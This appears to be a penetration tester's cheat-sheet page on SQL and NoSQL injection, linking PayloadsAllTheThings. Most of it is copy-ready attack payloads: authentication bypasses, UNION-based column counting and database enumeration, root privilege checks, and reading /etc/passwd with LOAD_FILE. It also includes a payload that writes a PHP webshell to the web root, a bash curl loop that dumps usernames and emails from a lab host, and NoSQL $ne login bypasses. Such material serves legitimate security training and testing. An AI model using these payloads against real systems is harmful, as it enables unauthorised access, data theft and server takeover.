---
icon: syringe
---

# SQLi

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}
PayloadsAllTheThings
{% endembed %}

## <mark style="color:orange;">`MySQL`</mark>

{% hint style="info" %}
### <mark style="color:green;">`Python`</mark>&#x20;

* <mark style="color:purple;">**Doesn't need**</mark>**&#x20;**<mark style="color:orange;">**`;`**</mark>**&#x20;**<mark style="color:purple;">**at the end.**</mark>

***

### <mark style="color:orange;">`PHP`</mark>&#x20;

### <mark style="color:purple;">Authentication Methods:</mark>

1. <mark style="color:red;">**`Querying for matching username and password`**</mark><mark style="color:purple;">:</mark>
   * <mark style="color:purple;">This method involves running an SQL query that looks for rows where both the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**username**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**password (or password hash)**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">match the user's input.</mark>
   * <mark style="color:purple;">If any rows are returned (meaning a match is found), the user is allowed to log in.</mark>
2. <mark style="color:red;">**`Ensuring exactly one result`**</mark><mark style="color:purple;">:</mark>
   * <mark style="color:purple;">The query looks for matching</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**username**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**password**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">(or hash), but it only allows login if</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**exactly one result**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">is returned.</mark>
3. <mark style="color:red;">**`Querying based on username, then checking the password hash separately`**</mark><mark style="color:purple;">:</mark>
   * <mark style="color:purple;">Query the database based</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**only on the username**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">(without initially checking the password) and retrieving the user's</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**password hash**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">from the database.</mark>
   * <mark style="color:purple;">Once the username is found, the password hash is compared to the one entered by the user.</mark>
{% endhint %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass" %}
Auth Bypass
{% endembed %}

***

{% hint style="info" %}
### <mark style="color:orange;">`Recon`</mark>

* <mark style="color:purple;">**Always test both**</mark>**&#x20;**<mark style="color:orange;">**`"`**</mark>**&#x20;**<mark style="color:purple;">**and**</mark>**&#x20;**<mark style="color:orange;">**`'`**</mark>&#x20;
* <mark style="color:purple;">Bypass authentication by making the condition always true, followed by a comment to ignore the rest of the query.</mark>

```sql
' or 1=1-- -
```

* <mark style="color:purple;">If the previous query doesn't work try to exploits string comparison without breaking the query structure:</mark>

```sql
" or "1"="1
```

* <mark style="color:purple;">Sometimes the password field may appear before the username. To determine the structure, use brackets:</mark>

```sql
"))--
```

* <mark style="color:purple;">If it's not possible to see the response from the query there could be still a</mark> <mark style="color:orange;">**`BLIND`**</mark> <mark style="color:purple;">injection:</mark>

```sql
' OR SLEEP(5) -- 
```

***

### <mark style="color:orange;">`Union`</mark>

* <mark style="color:purple;">Use</mark> <mark style="color:orange;">**`ORDER BY`**</mark> <mark style="color:purple;">or</mark> <mark style="color:orange;">**`UNION`**</mark> <mark style="color:purple;">with incremental column counts to determine how many columns are in the query:</mark>

```sql
' order by 1-- -
```

```sql
' order by 1,2-- -
```

```sql
' union select 1-- -
```

```sql
' union select 1,2-- -
```

* <mark style="color:purple;">Once you know the number of columns, check which column is rendering the results:</mark>

```sql
' UNION SELECT 1,'test',3,4-- -
```

* <mark style="color:purple;">Once you know which column renders visible data, u</mark><mark style="color:purple;">**se**</mark>**&#x20;**<mark style="color:orange;">**`LIMIT`**</mark> <mark style="color:purple;">to retrieve data row by row:</mark>

```sql
' UNION SELECT 1,username,3,4 FROM users LIMIT 1,1-- -
```

* <mark style="color:orange;">**`LIMIT offset, count`**</mark><mark style="color:purple;">**,  i**</mark><mark style="color:purple;">s the typical syntax for</mark> <mark style="color:orange;">**`LIMIT`**</mark><mark style="color:purple;">:</mark>
  * <mark style="color:orange;">**`offset`**</mark><mark style="color:purple;">: The starting point (the row number) from which to begin returning results. (remember that</mark> <mark style="color:orange;">**`SQL`**</mark> <mark style="color:purple;">indexing usually starts at</mark> <mark style="color:orange;">**`0`**</mark><mark style="color:purple;">, so</mark> <mark style="color:orange;">**`1`**</mark> <mark style="color:purple;">is the second row).</mark>
  * <mark style="color:orange;">**`count`**</mark><mark style="color:purple;">: The number of rows to return starting from the</mark> <mark style="color:orange;">**`offset`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Using</mark> <mark style="color:orange;">**`curl`**</mark> <mark style="color:purple;">in conjunction with</mark> <mark style="color:orange;">**`SQLi`**</mark> <mark style="color:purple;">can be very useful for enumerating databases via the</mark> <mark style="color:orange;">**`LIMIT`**</mark> <mark style="color:purple;">clause. Below is a simple script template that you can modify and adapt for your specific use case:</mark>

{% code overflow="wrap" %}
```bash
URL="http://10.10.10.31/cmsdata/forgot.php"
PAYLOAD="email=a@b.c' UNION SELECT NULL, username, email, NULL FROM users LIMIT \${i},1;-- -"
START=1
END=1000
FIELD=2  # Assume username is in the second column
TAG="<td>"  # We're looking for data in <td> tags
FILTER="^with"  # Exclude lines starting with "with"

for i in $(seq $START $END); do
    response=$(curl -s "$URL" --data-urlencode "$(echo $PAYLOAD | sed "s/\${i}/$i/")")
    
    echo "Fetching row $i"
    echo "$response" | grep "$TAG" | awk "{print \$$FIELD}" | grep -v "$FILTER" || break
done
```
{% endcode %}

* <mark style="color:purple;">You can also use</mark> <mark style="color:orange;">**`GROUP_CONCAT`**</mark> <mark style="color:purple;">as an alternative to</mark> <mark style="color:orange;">**`LIMIT`**</mark><mark style="color:purple;">, especially  when you donâ€™t want to retrieve each row individually but rather aggregate all the data from one or more columns in one query:</mark>

{% code overflow="wrap" %}
```sql
' UNiON SELECT 1,group_concat(schema_name),3,'a@b.c' from information_schema.schemata;-- -
```
{% endcode %}

***

### <mark style="color:orange;">`Enumeration`</mark>

{% code title="Current database" %}
```sql
 union select 1,2,3,database()--
```
{% endcode %}

{% code title="Database version" %}
```sql
' UNION select 1,@@version,3,4-- -
```
{% endcode %}

{% code title="Current User" %}
```sql
' UNION SELECT 1,user(),3,4-- -
```
{% endcode %}

{% code title="Concatenation" overflow="wrap" %}
```sql
' union select 1,2,3,concat(column1, ':', column2, ':', column3, ':', column4) from user-- -
```
{% endcode %}

#### <mark style="color:orange;">`Information_schema`</mark>

* <mark style="color:purple;">If you want to know how many databases there are:</mark>

{% code title="Information Schema" overflow="wrap" %}
```sql
' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -
```
{% endcode %}

* <mark style="color:purple;">To look how many tables in a database:</mark>

{% code overflow="wrap" %}
```sql
' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = 'database'-- -
```
{% endcode %}

* <mark style="color:purple;">To look how many columns in a table:</mark>

{% code overflow="wrap" %}
```sql
' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = 'table'-- -
```
{% endcode %}

* <mark style="color:purple;">To look the content of the columns:</mark>

{% code overflow="wrap" %}
```sql
' union select 1,2,3,concat(column1, ':', column2, ':', column3, ':', column4) from user-- -
```
{% endcode %}

#### <mark style="color:orange;">`Privileges`</mark>

{% code title="Checks admin privileges" overflow="wrap" %}
```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
{% endcode %}

{% code title=" Extracting privilege details of the root user" overflow="wrap" %}
```sql
' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
{% endcode %}

{% code title="Find which directories can be accessed" overflow="wrap" %}
```sql
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
{% endcode %}

***

### <mark style="color:orange;">`File Injection`</mark>

{% code title="Read local file" overflow="wrap" %}
```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
{% endcode %}

{% code title="Write a string to a local file" overflow="wrap" %}
```sql
`select 'file written successfully!' into outfile '/var/www/html/proof.txt
```
{% endcode %}

{% code title="Creates a webshell" overflow="wrap" %}
```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`Blind`</mark>

* <mark style="color:purple;">Ask questions to application; this query asks if there is any user starting by</mark> <mark style="color:orange;">**`a`**</mark><mark style="color:purple;">:</mark>

```sql
UNION select user,2,3 from mysql.user where user like 'a%'-- -
```
{% endhint %}

***

## <mark style="color:orange;">`NoSQL`</mark>

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass" %}
PayloadAllThings
{% endembed %}

{% hint style="info" %}
### <mark style="color:purple;">Login Bypass</mark>

* <mark style="color:purple;">With</mark> <mark style="color:orange;">**`Content-Type: application/x-www-form-urlencoded`**</mark> <mark style="color:purple;">try:</mark>

```json
user=admin&password[$ne]=wrongpassword
```

* <mark style="color:purple;">Set the</mark> <mark style="color:orange;">**`Content-Type`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`application/json`**</mark> <mark style="color:purple;">on the</mark> <mark style="color:orange;">**`POST`**</mark> <mark style="color:purple;">request</mark>

```json
{"user": "admin", "password": {"$ne": "wrongpassword"}}
```
{% endhint %}

